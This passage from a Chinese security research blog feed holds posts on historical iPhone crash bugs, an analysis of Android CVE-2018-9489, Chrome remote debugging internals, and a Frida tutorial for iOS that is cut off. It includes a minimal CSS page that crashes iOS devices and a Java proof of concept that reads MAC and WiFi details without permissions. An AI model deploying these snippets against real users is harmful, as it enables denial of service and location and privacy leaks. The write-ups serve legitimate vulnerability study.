rel="noopener">https://googleprojectzero.blogspot.com/2018/09/oatmeal-on-universal-cereal-bus.html</a></li><li><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1583" target="_blank" rel="noopener">https://bugs.chromium.org/p/project-zero/issues/detail?id=1583</a> (“directory traversal over USB via injection in blkid output”)</li><li><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1590" target="_blank" rel="noopener">https://bugs.chromium.org/p/project-zero/issues/detail?id=1590</a> (“privesc zygote-&gt;init; chain from USB”)</li><li>使用树莓派 Zero 实现带回显的新型 Bad USB <a href="http://shumeipai.nxez.com/2018/06/26/using-raspberry-pi-zero-to-implement-new-bad-usb-with-echo.html" target="_blank" rel="noopener">http://shumeipai.nxez.com/2018/06/26/using-raspberry-pi-zero-to-implement-new-bad-usb-with-echo.html</a></li><li>FUSE <a href="http://man7.org/linux/man-pages/man4/fuse.4.html" target="_blank" rel="noopener">http://man7.org/linux/man-pages/man4/fuse.4.html</a></li></ol>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>历史上能使iPhone设备Crash的案例</title>
      <link href="/2018/09/17/iPhone%E6%89%93%E5%BC%80%E6%9F%90%E7%BD%91%E7%AB%99%E9%87%8D%E5%90%AF%E5%88%86%E6%9E%90/"/>
      <url>/2018/09/17/iPhone%E6%89%93%E5%BC%80%E6%9F%90%E7%BD%91%E7%AB%99%E9%87%8D%E5%90%AF%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h1 id="历史上的iPhone-crash事件"><a href="#历史上的iPhone-crash事件" class="headerlink" title="历史上的iPhone crash事件"></a>历史上的iPhone crash事件</h1><h3 id="1-2018年5月，点击黑点表情卡死"><a href="#1-2018年5月，点击黑点表情卡死" class="headerlink" title="1. 2018年5月，点击黑点表情卡死"></a>1. 2018年5月，点击黑点表情卡死</h3><p><a href="https://baijiahao.baidu.com/s?id=1600048067011062679&amp;wfr=spider&amp;for=pc" target="_blank" rel="noopener">https://baijiahao.baidu.com/s?id=1600048067011062679&amp;wfr=spider&amp;for=pc</a> 影响iOS 10/11<br><img src="/images/pasted-151.png" alt="upload successful"></p><h3 id="2-2018年1月-chaiOS-bug"><a href="#2-2018年1月-chaiOS-bug" class="headerlink" title="2. 2018年1月 chaiOS bug"></a>2. 2018年1月 chaiOS bug</h3><pre><code>https://www.idownloadblog.com/2018/01/18/a-fix-for-chaios-messages-bug-will-arrive-next-week/  影响 iOS 10 - 11.2.5</code></pre><p><img src="/images/pasted-150.png" alt="upload successful"></p><h3 id="3-2017年1月，发送“白旗-0-彩虹”表情卡死"><a href="#3-2017年1月，发送“白旗-0-彩虹”表情卡死" class="headerlink" title="3. 2017年1月，发送“白旗+0+彩虹”表情卡死"></a>3. 2017年1月，发送“白旗+0+彩虹”表情卡死</h3><p><a href="https://www.leiphone.com/news/201701/GDXeBJxyggxGoe7O.html" target="_blank" rel="noopener">https://www.leiphone.com/news/201701/GDXeBJxyggxGoe7O.html</a><br><img src="/images/pasted-152.png" alt="upload successful"> iOS 10.0到10.2.1</p><h3 id="4-2017年5月，gif导致iPhone重启"><a href="#4-2017年5月，gif导致iPhone重启" class="headerlink" title="4. 2017年5月，gif导致iPhone重启"></a>4. 2017年5月，gif导致iPhone重启</h3><p><a href="https://www.leiphone.com/news/201705/pUQ6Rzdo26OHWgm7.html" target="_blank" rel="noopener">https://www.leiphone.com/news/201705/pUQ6Rzdo26OHWgm7.html</a></p><h3 id="5-2016年，一段美拍视频导致iPhone崩溃"><a href="#5-2016年，一段美拍视频导致iPhone崩溃" class="headerlink" title="5. 2016年，一段美拍视频导致iPhone崩溃"></a>5. 2016年，一段美拍视频导致iPhone崩溃</h3><p><a href="https://www.zhihu.com/question/51630274" target="_blank" rel="noopener">https://www.zhihu.com/question/51630274</a><br><img src="/images/pasted-153.png" alt="upload successful"></p><h3 id="6-2015年5月，“Effective-Power”-Unicode解码"><a href="#6-2015年5月，“Effective-Power”-Unicode解码" class="headerlink" title="6. 2015年5月，“Effective Power” Unicode解码"></a>6. 2015年5月，“Effective Power” Unicode解码</h3><p><a href="https://metro.co.uk/2015/05/27/theres-a-way-of-crashing-someones-iphone-with-a-text-message-5217671/" target="_blank" rel="noopener">https://metro.co.uk/2015/05/27/theres-a-way-of-crashing-someones-iphone-with-a-text-message-5217671/</a><br><img src="/images/pasted-154.png" alt="upload successful"></p><h3 id="7-2018年，打开某网站Crash"><a href="#7-2018年，打开某网站Crash" class="headerlink" title="7. 2018年，打开某网站Crash"></a>7. 2018年，打开某网站Crash</h3><p><a href="https://www.bleepingcomputer.com/news/security/new-css-attack-restarts-an-iphone-or-freezes-a-mac/" target="_blank" rel="noopener">https://www.bleepingcomputer.com/news/security/new-css-attack-restarts-an-iphone-or-freezes-a-mac/</a></p><h5 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h5><p>使用iPhone打开<a href="https://xssle.com/ios/" target="_blank" rel="noopener">https://xssle.com/ios/</a> 这个网站，手机就会重启，此外在mac上用Safari浏览器打卡也会陷入卡顿，但不至于重启。</p><h5 id="网页分析"><a href="#网页分析" class="headerlink" title="网页分析"></a>网页分析</h5><p>该网页的源码如下：</p><p><img src="/images/pasted-142.png" alt="upload successful"></p><p>可以看到网页由几部分组成：</p><ul><li>一张背景图片不断重复</li><li>3000多个div嵌套</li><li>每个div设置了backdrop-filter、-webkit-backdrop-filter属性</li></ul><p>通过精简测试，发现背景图片不影响crash，故能造成iPhone crash的核心代码为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">    div&#123;</span><br><span class="line">        backdrop-filter: blur(10px);</span><br><span class="line">        -webkit-backdrop-filter: blur(10px);</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;div&gt;&lt;div&gt;&lt;div&gt;&lt;div&gt; ..... &lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;</span><br></pre></td></tr></table></figure></p><h5 id="crash分析"><a href="#crash分析" class="headerlink" title="crash分析"></a>crash分析</h5><p>查看log发现crash log类型为unknown：<br><img src="/images/pasted-143.png" alt="upload successful"><br>kernel打印出一堆奇怪的东西：<br><img src="/images/pasted-144.png" alt="upload successful"><br>推测应该是webkit占用了过多的内核资源</p><h3 id="8-2020年4月，发送“意大利国旗-西德文”崩溃"><a href="#8-2020年4月，发送“意大利国旗-西德文”崩溃" class="headerlink" title="8. 2020年4月，发送“意大利国旗+西德文”崩溃"></a>8. 2020年4月，发送“意大利国旗+西德文”崩溃</h3><p><a href="https://www.theverge.com/2020/4/24/21234191/apple-iphone-crash-text-bug-ios-13-problem" target="_blank" rel="noopener">https://www.theverge.com/2020/4/24/21234191/apple-iphone-crash-text-bug-ios-13-problem</a><br><img src="/images/pasted-213.png" alt="upload successful"></p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>CVE-2018-9489分析</title>
      <link href="/2018/09/07/CVE-2018-9489%E5%88%86%E6%9E%90/"/>
      <url>/2018/09/07/CVE-2018-9489%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>CVE-2018-9489是一个很简单，很鸡肋的漏洞，但漏洞无贵贱，在一些特殊的场景中往往会利用这些漏洞完成不可思议的利用。</p><p>简而言之，CVE-2018-9489这个漏洞就是一个0权限的app可以读到系统的mac地址、wifi信息，而这些信息如果是一个普通的app去读取的话是需要申请权限的。</p><p>CVE-2018-9489漏洞通过监听NETWORK_STATE_CHANGED_ACTION和WIFI_P2P_THIS_DEVICE_CHANGED_ACTION这两个广播来获得这些信息。</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>Android系统通过WifiManager.NETWORK_STATE_CHANGED_ACTION和WifiP2pManager.WIFI_P2P_THIS_DEVICE_CHANGED_ACTION这两个广播发送系统的<strong>MAC地址、BSSID、wifi名称、IP地址、DNS</strong>等信息。</p><p>正常情况下，通过WifiManager类访问这些信息时，需要注册“ACCESS_WIFI_STATE”权限。我们知道搜集了mac地址和BSSID信息时，就可以进行wifi定位，而正常的wifi定位时需要注册“ACCESS_FINE_LOCATION” 和 “ACCESS_COARSE_LOCATION”权限的。</p><p>此外，Android为了数据隐私，从这个6.0版本开始， Android 移除了通过 WiFi 和蓝牙 API 来在应用程序中可编程的访问本地硬件标示符。现在 WifiInfo.getMacAddress() 和 BluetoothAdapter.getAddress() 方法都将返回 “02:00:00:00:00:00”。</p><p>然而通过监听系统广播的方式，一个普通App可以不用申请任何权限去获得这些信息。当然，如上所述，利用CVE-2018-9489可以进行<strong>wifi定位、读取MAC地址、内网扫描</strong>等。</p><h2 id="PoC代码"><a href="#PoC代码" class="headerlink" title="PoC代码"></a>PoC代码</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">protected void onCreate(Bundle savedInstanceState) &#123;</span><br><span class="line">    super.onCreate(savedInstanceState);</span><br><span class="line">    setContentView(R.layout.activity_main);</span><br><span class="line"></span><br><span class="line">    BroadcastReceiver receiver = new BroadcastReceiver() &#123;</span><br><span class="line">        @Override</span><br><span class="line">        public void onReceive(Context context, Intent intent) &#123;</span><br><span class="line">            Log.d(&quot;m4bln&quot;, intent.getAction());</span><br><span class="line">            String extrasString = &quot;&quot;;</span><br><span class="line">            Bundle extras = intent.getExtras();</span><br><span class="line"></span><br><span class="line">            if (extras != null) &#123;</span><br><span class="line">                Set&lt;String&gt; keySet = extras.keySet();</span><br><span class="line">                for (String key : keySet) &#123;</span><br><span class="line">                    try &#123;</span><br><span class="line">                        String extraValue = intent.getExtras().get(key).toString();</span><br><span class="line">                        extrasString += key + &quot;: &quot; + extraValue + &quot;\n&quot;;</span><br><span class="line">                    &#125; catch (Exception e) &#123;</span><br><span class="line">                        Log.d(&quot;m4bln&quot;, &quot;Exception in getExtras: &quot; + e.toString());</span><br><span class="line">                        extrasString += key + &quot;: Exception:&quot; + e.getMessage() + &quot;\n&quot;;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            Log.d(&quot;m4bln&quot;, extrasString);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    IntentFilter filter = new IntentFilter();</span><br><span class="line">    filter.addAction(WifiManager.NETWORK_STATE_CHANGED_ACTION);</span><br><span class="line">    filter.addAction(WifiP2pManager.WIFI_P2P_THIS_DEVICE_CHANGED_ACTION);</span><br><span class="line">    registerReceiver(receiver, filter);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>读到的广播数据如下：</p><p><img src="/images/pasted-141.png" alt="upload successful"></p><p>该漏洞在Android 9.0修复，但由于音响范围较小，之前的版本Android不作处理。</p><p>参考资料：</p><ol><li><a href="https://wwws.nightwatchcybersecurity.com/2018/08/29/sensitive-data-exposure-via-wifi-broadcasts-in-android-os-cve-2018-9489/" target="_blank" rel="noopener">https://wwws.nightwatchcybersecurity.com/2018/08/29/sensitive-data-exposure-via-wifi-broadcasts-in-android-os-cve-2018-9489/</a></li></ol>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>Chrome远程调试</title>
      <link href="/2018/09/01/%E8%B0%83%E8%AF%95%E7%A0%94%E7%A9%B6/"/>
      <url>/2018/09/01/%E8%B0%83%E8%AF%95%E7%A0%94%E7%A9%B6/</url>
      
        <content type="html"><![CDATA[<h2 id="远程调试"><a href="#远程调试" class="headerlink" title="远程调试"></a>远程调试</h2><p>Chrome的调试目标主要分两种：Chrome PC 浏览器和 Chrome Mobile</p><p><img src="/images/pasted-135.png" alt="upload successful"></p><h3 id="调试PC端chrome"><a href="#调试PC端chrome" class="headerlink" title="调试PC端chrome"></a>调试PC端chrome</h3><p>除了使用“审查元素”外，还可以用一个进程的chrome调试另一个进程的chrome。利用命令行启动chrome，并开启调试端口即可：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo /Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome --remote-debugging-port=2333</span><br></pre></td></tr></table></figure></p><p>需要注意被调试端暴露的端口只接受来自127.0.0.1 或者localhost 的端口请求。</p><h3 id="调试Android端chrome"><a href="#调试Android端chrome" class="headerlink" title="调试Android端chrome"></a>调试Android端chrome</h3><p>调试Android端Chrome需要: </p><ol><li>adb连接（USB线连接或adb网络调试）</li><li>手机端webview需要打开调试模式<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">webview.setWebContentsDebuggingEnabled(true)</span><br></pre></td></tr></table></figure></li></ol><p>满足上述2点后，在PC上的chrome中输入chrome://inspect或about://inspect,即可进入调试界面。</p><p><img src="/images/pasted-136.png" alt="upload successful"></p><h2 id="调试实现"><a href="#调试实现" class="headerlink" title="调试实现"></a>调试实现</h2><p>Chrome的调试本质上通过端口来实现，PC端chrome在开启调试模式时会指定端口，Android端通过adb forward来实现：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb forward tcp:2333 localabstract:webview_devtools_remote_6784</span><br></pre></td></tr></table></figure></p><p>被调试的webview在手机上创建一个Unix Domain Socket, 这个socket的名字为 webview_devtools<em>remote</em><pid>,其中pid为webview所处的进程号，执行adb forward命令后，adb将这个<br>Unix Domain Socket转发到PC上一个本地端口，进而实现了调试。</pid></p><h3 id="调试权限"><a href="#调试权限" class="headerlink" title="调试权限"></a>调试权限</h3><p>Google 为了限制调试端口的接入范围，对于 Chrome PC 浏览器，调试端口只接受来自 127.0.0.1 或者 localhost 的数据请求，所以，无法通过你的本地机器 IP 来调试 Chrome。</p><p>对于 Android Chrome/WebView，调试端口只接受来自于 shell 这个用户数据请求，也就是说只能通过 USB 进行调试，或者通过adb网络连接调试。</p><p>为了测试这一点，我们通过本地socket连接Unix Domain Socket进行了实验验证：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;stddef.h&gt;</span><br><span class="line">#include &lt;sys/un.h&gt;</span><br><span class="line">#include &lt;sys/socket.h&gt;</span><br><span class="line">void send_remote_request(char *msg)</span><br><span class="line">&#123;</span><br><span class="line">    int localsocket, len;</span><br><span class="line">    struct sockaddr_un remote;</span><br><span class="line"></span><br><span class="line">    if ((localsocket = socket(AF_UNIX, SOCK_STREAM, 0)) == -1) &#123;</span><br><span class="line">    exit(1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    char *name=&quot;webview_devtools_remote_6784&quot;;//与java上层相同哦</span><br><span class="line"></span><br><span class="line">    remote.sun_path[0] = &apos;\0&apos;;  /* abstract namespace */</span><br><span class="line">    strcpy(remote.sun_path+1, name);</span><br><span class="line">    remote.sun_family = AF_UNIX;</span><br><span class="line">    int nameLen = strlen(name);</span><br><span class="line">    len = 1 + nameLen + offsetof(struct sockaddr_un, sun_path);</span><br><span class="line"></span><br><span class="line">    if (connect(localsocket, (struct sockaddr *)&amp;remote, len) == -1) &#123;</span><br><span class="line">        printf(&quot;connect error\n&quot;);</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    if (send(localsocket, msg, strlen(msg),0) == -1) &#123;</span><br><span class="line">        printf(&quot;send error\n&quot;);</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    char buf[1024];</span><br><span class="line"></span><br><span class="line">    if (recv(localsocket,buf,1024, 0) == -1)&#123;</span><br><span class="line">        printf(&quot;rece error\n&quot;);</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    printf(&quot;received: %s&quot;,buf);</span><br><span class="line">    </span><br><span class="line">    close(localsocket);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    char *http=&quot;GET /json/version HTTP/1.1\r\nHost: 127.0.0.1\r\nUser-Agent: curl/7.54.0\r\nAccept: */*\r\n\r\n&quot;;</span><br><span class="line">    send_remote_request(http);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>上述代码编译的程序在uid=0(root权限)运行时，会受到返回socket数据：</p><p><img src="/images/pasted-137.png" alt="upload successful"></p><p>在其他权限执行时，socket会连接错误：</p><p><img src="/images/pasted-138.png" alt="upload successful"></p><h3 id="请求调试端口"><a href="#请求调试端口" class="headerlink" title="请求调试端口"></a>请求调试端口</h3><p>通过以上的调试方式的接入以及调试端口的打开，这个时候在浏览器中请求127.0.0.1:2333，可以看到以下内容：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[ &#123;</span><br><span class="line">   &quot;description&quot;: &quot;&#123;\&quot;attached\&quot;:true,\&quot;empty\&quot;:false,\&quot;height\&quot;:1055,\&quot;screenX\&quot;:0,\&quot;screenY\&quot;:210,\&quot;visible\&quot;:true,\&quot;width\&quot;:845&#125;&quot;,</span><br><span class="line">   &quot;devtoolsFrontendUrl&quot;: &quot;http://chrome-devtools-frontend.appspot.com/serve_rev/@8daf58f7f40d22013c59388236c8e71e1117cb2c/inspector.html?ws=127.0.0.1:2333/devtools/page/0F8BF00855E9F57A1D62802C1882DE05&quot;,</span><br><span class="line">   &quot;faviconUrl&quot;: &quot;http://mat1.gtimg.com/www/icon/favicon2.ico&quot;,</span><br><span class="line">   &quot;id&quot;: &quot;0F8BF00855E9F57A1D62802C1882DE05&quot;,</span><br><span class="line">   &quot;title&quot;: &quot;腾讯首页&quot;,</span><br><span class="line">   &quot;type&quot;: &quot;page&quot;,</span><br><span class="line">   &quot;url&quot;: &quot;http://www.qq.com/&quot;,</span><br><span class="line">   &quot;webSocketDebuggerUrl&quot;: &quot;ws://127.0.0.1:2333/devtools/page/0F8BF00855E9F57A1D62802C1882DE05&quot;</span><br><span class="line">&#125; ]</span><br></pre></td></tr></table></figure></p><p>其中，最重要的 2 个参数分别是 id 和 webSocketDebuggerUrl。</p><p>Chrome 会为每个页面分配一个唯一的 id，作为该页面的唯一标识符。几乎对目标浏览器的所有操作都是需要带上这个 id。</p><p>webSocketDebuggerUrl 则在调试该页面需要用到的一个 WebSocket 连接。chrome 的 devtool 的所有调试功能，都是基于 Remote Debugging Protocol 使用 WebSocket 来进行数据传输的。每一个页面都有自己不同的 webSocketDebuggerUrl。这个 webSocketDebuggerUrl是通过 url 的 query 参数传递给 chrome devtool 的。</p><p>chrome 的 devtool 可以从 Chrome 浏览器中进行提取 devtool 源码或者从 blink 源码中获取。在部署好自己的 chrome devtool 代码之后，下面既可以开始对 Chrome 进行调试, 浏览器输入以下内容：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://path_to_your_devtool/devtool.html?ws=127.0.0.1:2333/devtools/page/0F8BF00855E9F57A1D62802C1882DE05</span><br></pre></td></tr></table></figure></p><p>Chrome 提供了以下这些 http 接口控制目标浏览器:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 获取当前所有可调式页面信息</span><br><span class="line">http://127.0.0.1:9222/json</span><br><span class="line"></span><br><span class="line"># 获取调试目标 WebView/blink 的版本号</span><br><span class="line">http://127.0.0.1:9222/json/version</span><br><span class="line"></span><br><span class="line"># 创建新的 tab，并加载 url</span><br><span class="line">http://127.0.0.1:9222/json/new?url</span><br><span class="line"></span><br><span class="line"># 关闭 id 对应的 tab</span><br><span class="line">http://127.0.0.1:9222/json/close/id</span><br></pre></td></tr></table></figure></p><h2 id="Chrome-Android远程调试诊断"><a href="#Chrome-Android远程调试诊断" class="headerlink" title="Chrome Android远程调试诊断"></a>Chrome Android远程调试诊断</h2><h3 id="通过chrome-inspect调试webview出现404"><a href="#通过chrome-inspect调试webview出现404" class="headerlink" title="通过chrome://inspect调试webview出现404"></a>通过chrome://inspect调试webview出现404</h3><p>可能问题：<br>PC端的chrome比手机端版本新，使用inspect feedback可解；<br>如果没有inspect feedback，使用旧版本的Chrome调试；<br>使用离线的第三方工具包调试，参考<a href="https://www.cnblogs.com/slmk/p/7591126.html" target="_blank" rel="noopener">https://www.cnblogs.com/slmk/p/7591126.html</a></p><p>其他参考链接：<br>1.<a href="https://www.cnblogs.com/slmk/p/9832081.html" target="_blank" rel="noopener">https://www.cnblogs.com/slmk/p/9832081.html</a><br>2.<a href="https://stackoverflow.com/questions/51519636/google-chrome-developer-tools-android-debugging-returns-http-1-1-404-not-found" target="_blank" rel="noopener">https://stackoverflow.com/questions/51519636/google-chrome-developer-tools-android-debugging-returns-http-1-1-404-not-found</a><br>3.<a href="https://bugs.chromium.org/p/chromium/issues/detail?id=853525&amp;can=8&amp;q=&amp;colspec=ID%20Pri%20M%20Stars%20ReleaseBlock%20Component%20Status%20Owner%20Summary%20OS%20Modified" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=853525&amp;can=8&amp;q=&amp;colspec=ID%20Pri%20M%20Stars%20ReleaseBlock%20Component%20Status%20Owner%20Summary%20OS%20Modified</a></p><h3 id="是否开启了unix-domain-socket"><a href="#是否开启了unix-domain-socket" class="headerlink" title="是否开启了unix domain socket"></a>是否开启了unix domain socket</h3><p>运行下列命令，如果查到abstract socket：@chrome_devtools_remote，则表明chrome for android 开启了unix domain socket。如果查到abstract socket@webview_devtools_remote_27594，则说明了AndroidWebView也开启了unix domain socket<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/net/unix | grep --text  _devtools_remote</span><br></pre></td></tr></table></figure></p><p><img src="/images/pasted-139.png" alt="upload successful"></p><h3 id="是否开启了websocket服务器"><a href="#是否开启了websocket服务器" class="headerlink" title="是否开启了websocket服务器"></a>是否开启了websocket服务器</h3><p>可以通过ptyhon库websocket-client来测试.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ sudo pip install websocket-client</span><br><span class="line">python</span><br><span class="line">&gt;&gt;&gt; import websocket</span><br><span class="line">&gt;&gt;&gt; ws = websocket.create_connection(&quot;ws://localhost:4000/devtools/page/140&quot;)</span><br><span class="line">&gt;&gt;&gt; ws.send(&quot;Hello,world&quot;)</span><br><span class="line">17</span><br><span class="line">&gt;&gt;&gt; result =  ws.recv()</span><br><span class="line">&gt;&gt;&gt; print result</span><br><span class="line">&#123;&quot;error&quot;:&#123;&quot;code&quot;:-32700,&quot;message&quot;:&quot;Message must be in JSON format&quot;&#125;,&quot;id&quot;:null&#125;</span><br></pre></td></tr></table></figure></p><p>参考资料：</p><ol><li>揭秘浏览器远程调试技术 <a href="http://taobaofed.org/blog/2016/10/19/chrome-remote-debugging-technics/" target="_blank" rel="noopener">http://taobaofed.org/blog/2016/10/19/chrome-remote-debugging-technics/</a></li><li>Chrome for Android Remote Inspector 原理 <a href="https://blog.csdn.net/xxhforest/article/details/52204197" target="_blank" rel="noopener">https://blog.csdn.net/xxhforest/article/details/52204197</a></li><li>LocalServerSocket <a href="https://developer.android.com/reference/android/net/LocalServerSocket" target="_blank" rel="noopener">https://developer.android.com/reference/android/net/LocalServerSocket</a></li><li>Linux下进程间通讯方式 - UNIX Domain Socket <a href="https://blog.csdn.net/z2066411585/article/details/78966434/" target="_blank" rel="noopener">https://blog.csdn.net/z2066411585/article/details/78966434/</a></li></ol>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>在iOS上使用Frida</title>
      <link href="/2018/08/24/%E5%9C%A8iOS%E4%B8%8A%E4%BD%BF%E7%94%A8Frida/"/>
      <url>/2018/08/24/%E5%9C%A8iOS%E4%B8%8A%E4%BD%BF%E7%94%A8Frida/</url>
      
        <content type="html"><![CDATA[<h3 id="准备Frida环境"><a href="#准备Frida环境" class="headerlink" title="准备Frida环境"></a>准备Frida环境</h3><ul><li>越狱设备<br>1.在你的iOS设备上打开Cydia应用程序。<br>2.添加一个源，URL为：<a href="https://build.frida.re" target="_blank" rel="noopener">https://build.frida.re</a><br>3.打开Source或搜索Frida，单击Modify，然后单击Install。</li><li>非越狱设备<br>需要将frida-garget打包到app中，参考之前的文章《iOS应用安全- 非越狱下使用Frida》</li></ul><h3 id="frida用法"><a href="#frida用法" class="headerlink" title="frida用法"></a>frida用法</h3><h4 id="1-注入到进程"><a href="#1-注入到进程" class="headerlink" title="1.注入到进程"></a>1.注入到进程</h4><p>注入进程有两种方式：</p><ul><li><p>通过frida-tools的REPL</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida -U Safari -l NSURL_openURL_hook.js</span><br></pre></td></tr></table></figure></li><li><p>通过frida-bindings<br>以python为例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">jscode=&apos;&apos;&apos;</span><br><span class="line">console.log(&quot;add js code here&quot;);</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">process = frida.get_usb_device().attach(&quot;Safari&quot;)</span><br><span class="line">script = process.create_script(jscode)</span><br><span class="line">script.on(&apos;message&apos;, on_message)</span><br><span class="line">print(&apos;[*] dump all class into obclass.txt&apos;)</span><br><span class="line">script.load()</span><br></pre></td></tr></table></figure></li></ul><h4 id="2-列出所有运行的进程"><a href="#2-列出所有运行的进程" class="headerlink" title="2.列出所有运行的进程"></a>2.列出所有运行的进程</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida-ps -U</span><br></pre></td></tr></table></figure><p>frida-ps -Uai 以pid、名称、进程名称的格式输出<br><img src="/images/pasted-133.png" alt="upload successful"></p><h4 id="3-打印调用栈"><a href="#3-打印调用栈" class="headerlink" title="3.打印调用栈"></a>3.打印调用栈</h4><p>在hook到的函数中加入以下代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">console.log(&apos;\tBacktrace:\n\t&apos; + Thread.backtrace(this.context,</span><br><span class="line">Backtracer.ACCURATE).map(DebugSymbol.fromAddress)</span><br><span class="line">.join(&apos;\n\t&apos;));</span><br></pre></td></tr></table></figure></p><p><img src="/images/pasted-134.png" alt="upload successful"></p><h4 id="4-调用native函数"><a href="#4-调用native函数" class="headerlink" 